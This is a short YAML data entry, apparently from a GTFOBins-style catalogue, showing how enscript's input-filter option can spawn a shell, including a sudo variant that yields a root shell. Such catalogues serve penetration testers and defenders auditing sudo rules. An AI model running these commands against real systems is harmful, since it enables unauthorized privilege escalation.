---
functions:
  shell:
    - code: enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
  sudo:
    - code: sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
---
